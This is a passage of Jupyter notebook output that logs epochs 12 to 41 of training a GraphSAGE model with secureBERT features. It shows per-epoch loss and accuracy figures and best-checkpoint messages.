      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:44:46 | INFO | Epoch 12 | Train Loss: 0.3811 | Train Accuracy: 0.9175\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "002028beb43147149f804a6f7956f3dc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:44:47 | INFO | Validation Loss: 0.2834 | Validation Accuracy: 0.9361\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "97fb78f112f549b494db6191d622c548",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:00 | INFO | Epoch 13 | Train Loss: 0.3744 | Train Accuracy: 0.9185\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "65689b5fb1ae4efdbe45ef2a36d501cb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:01 | INFO | Validation Loss: 0.3004 | Validation Accuracy: 0.9314\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fa639a6bdef54543a963e84178e7649f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:13 | INFO | Epoch 14 | Train Loss: 0.3721 | Train Accuracy: 0.9192\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8b46c9d8a6d94037839ef34f6a0b0c69",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:15 | INFO | Validation Loss: 0.2830 | Validation Accuracy: 0.9358\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "077dd0a1a7da4adfb7b2240457cdb00d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:27 | INFO | Epoch 15 | Train Loss: 0.3622 | Train Accuracy: 0.9194\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5cd232f32583461d832b152223067457",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:29 | INFO | Validation Loss: 0.2874 | Validation Accuracy: 0.9352\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8fbdf04af0d04d0dbcfb348075c8d615",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:41 | INFO | Epoch 16 | Train Loss: 0.3588 | Train Accuracy: 0.9205\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "277c3b5335d24a45a223e14a327b5261",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:42 | INFO | Validation Loss: 0.2934 | Validation Accuracy: 0.9339\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5d0cc94916494a8d8092c20ab27eafbe",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:54 | INFO | Epoch 17 | Train Loss: 0.3692 | Train Accuracy: 0.9192\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8ba3c465e4e54fa389a196ff46e20711",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:45:55 | INFO | Validation Loss: 0.2960 | Validation Accuracy: 0.9335\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ddf1d61488494d6b9238948b4a60c139",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:46:08 | INFO | Epoch 18 | Train Loss: 0.3534 | Train Accuracy: 0.9221\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6f77f48d9ea74c0b9d7a30d500a83bf9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:46:10 | INFO | Validation Loss: 0.3442 | Validation Accuracy: 0.9212\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1662de561d5a4dd484b2b188fd78c23e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:46:22 | INFO | Epoch 19 | Train Loss: 0.3477 | Train Accuracy: 0.9233\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9f89436012ad49d5a5cc00c2645cd5e2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:46:23 | INFO | Validation Loss: 0.3510 | Validation Accuracy: 0.9180\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ebb2383a78a54968a13d36973786b27c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:46:36 | INFO | Epoch 20 | Train Loss: 0.3699 | Train Accuracy: 0.9182\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bdaa2f9c7d1c4825a354291472b3c71c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:46:37 | INFO | Validation Loss: 0.3266 | Validation Accuracy: 0.9273\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3958bbdc430c4a1f8ee10c7f10f27228",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:46:50 | INFO | Epoch 21 | Train Loss: 0.3728 | Train Accuracy: 0.9176\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "69deae40aa4049c0b011c044c82af2b5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:46:51 | INFO | Validation Loss: 0.3048 | Validation Accuracy: 0.9315\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7e6290db17894f1a92cd312f683dc9c6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:03 | INFO | Epoch 22 | Train Loss: 0.3601 | Train Accuracy: 0.9207\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "701edcb64cee499e9fd6d1ba166dbb1b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:04 | INFO | Validation Loss: 0.3489 | Validation Accuracy: 0.9211\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7c95d323dc0143a59bc00b87c75da4ba",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:16 | INFO | Epoch 23 | Train Loss: 0.3577 | Train Accuracy: 0.9215\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b807b216b3ea4679b134034cb93532c2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:18 | INFO | Validation Loss: 0.3171 | Validation Accuracy: 0.9291\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "371913c717c64fc0946b1ed690b49a4e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:30 | INFO | Epoch 24 | Train Loss: 0.3597 | Train Accuracy: 0.9208\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "04f30aaaf4de48b1bb5a1d0221ab669a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:32 | INFO | Validation Loss: 0.3118 | Validation Accuracy: 0.9306\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "56e875863a8a4274a79a3aedb568e039",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:43 | INFO | Epoch 25 | Train Loss: 0.3692 | Train Accuracy: 0.9184\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "501aa0b40ceb475ea193315e0e8d13f6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:45 | INFO | Validation Loss: 0.3127 | Validation Accuracy: 0.9304\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e55063d5a9454c7dbc73763aba162584",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:57 | INFO | Epoch 26 | Train Loss: 0.3498 | Train Accuracy: 0.9222\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9cad54ef361948528ab36df03ebd451d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:47:59 | INFO | Validation Loss: 0.2572 | Validation Accuracy: 0.9437\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_26_loss_0.2572_acc_0.9437\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4da0dba50a1b4c13b28db7f3df908bd0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:48:11 | INFO | Epoch 27 | Train Loss: 0.3542 | Train Accuracy: 0.9213\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8368fdc46a50493d81e42eeb635378d6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:48:12 | INFO | Validation Loss: 0.2815 | Validation Accuracy: 0.9363\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5c8e70e618ce4d95b731b7840fbf493f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:48:24 | INFO | Epoch 28 | Train Loss: 0.3579 | Train Accuracy: 0.9203\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b1ca1c354111462d91a6781bdd2c0d85",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:48:26 | INFO | Validation Loss: 0.2777 | Validation Accuracy: 0.9379\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "22f550deec7740bca91bfc654f29543c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:48:38 | INFO | Epoch 29 | Train Loss: 0.3482 | Train Accuracy: 0.9226\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4839577c97234d9f90abcd2bbff28c58",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:48:40 | INFO | Validation Loss: 0.3105 | Validation Accuracy: 0.9278\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0b18e04bf1b74efc86f7d4eed88d17f4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:48:53 | INFO | Epoch 30 | Train Loss: 0.3427 | Train Accuracy: 0.9227\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dd45e649bb654545a984072cc94cc119",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:48:55 | INFO | Validation Loss: 0.2872 | Validation Accuracy: 0.9373\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "14132d9b201c4796aae092ead2a9ef35",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:49:07 | INFO | Epoch 31 | Train Loss: 0.3338 | Train Accuracy: 0.9247\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "75a7b7a012334ae881bd6e3d1e3f2c71",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:49:08 | INFO | Validation Loss: 0.2690 | Validation Accuracy: 0.9401\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7c224d3df1d44aa9be1955cbd3640503",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:49:21 | INFO | Epoch 32 | Train Loss: 0.3119 | Train Accuracy: 0.9289\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ee4c3a8d710342a4865ff433bc78767e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:49:22 | INFO | Validation Loss: 0.2618 | Validation Accuracy: 0.9416\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "85f4c2e2e94a48dbab6a212cb4169bff",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:49:35 | INFO | Epoch 33 | Train Loss: 0.3137 | Train Accuracy: 0.9282\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "50fac14c378d48938f3fd32493e21627",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:49:37 | INFO | Validation Loss: 0.2233 | Validation Accuracy: 0.9522\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_33_loss_0.2233_acc_0.9522\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "59c1a4a5383c4a9aae77a03878aa04bd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:49:49 | INFO | Epoch 34 | Train Loss: 0.3102 | Train Accuracy: 0.9290\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fc8240541568432f853408f1517fa973",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:49:51 | INFO | Validation Loss: 0.2408 | Validation Accuracy: 0.9456\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d3436375dead4f30ba7cf45fe04f4d28",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:03 | INFO | Epoch 35 | Train Loss: 0.3016 | Train Accuracy: 0.9303\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "abd1943ce08a44f5b02d16f655830dda",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:04 | INFO | Validation Loss: 0.2638 | Validation Accuracy: 0.9371\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "27fb705a64fa4b0e989107765f3024a2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:17 | INFO | Epoch 36 | Train Loss: 0.2918 | Train Accuracy: 0.9321\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "13a009a3179f42dcbfc6adcf0facd3dd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:18 | INFO | Validation Loss: 0.2306 | Validation Accuracy: 0.9435\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "39e79be376034acbbd264565d33eca36",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:30 | INFO | Epoch 37 | Train Loss: 0.2777 | Train Accuracy: 0.9350\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6ed5c4f946eb481b82b8c15dc62ce2e7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:31 | INFO | Validation Loss: 0.2263 | Validation Accuracy: 0.9464\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ec1e444a4ab24dc9be5dc7da615208a1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:44 | INFO | Epoch 38 | Train Loss: 0.2635 | Train Accuracy: 0.9379\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "83e9c5833071491291f5adcbb265f268",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:45 | INFO | Validation Loss: 0.2323 | Validation Accuracy: 0.9461\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8112c19219d14406b45bfe3d51a29fc0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:57 | INFO | Epoch 39 | Train Loss: 0.2707 | Train Accuracy: 0.9354\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "053c0f3701164888921ed99596739e64",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:50:58 | INFO | Validation Loss: 0.1968 | Validation Accuracy: 0.9531\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_39_loss_0.1968_acc_0.9531\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5a108965550d4128b29aedf82e0ebb1a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:51:11 | INFO | Epoch 40 | Train Loss: 0.2503 | Train Accuracy: 0.9396\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1f24e03dabbc40e3ab23324e2feb3d0c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:51:12 | INFO | Validation Loss: 0.1687 | Validation Accuracy: 0.9587\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_40_loss_0.1687_acc_0.9587\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "456d3bc80fa3400fb91a42eef1e9058e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 12:51:25 | INFO | Epoch 41 | Train Loss: 0.2563 | Train Accuracy: 0.9383\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bff00675618e4f76a0e85a3d91c427ac",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
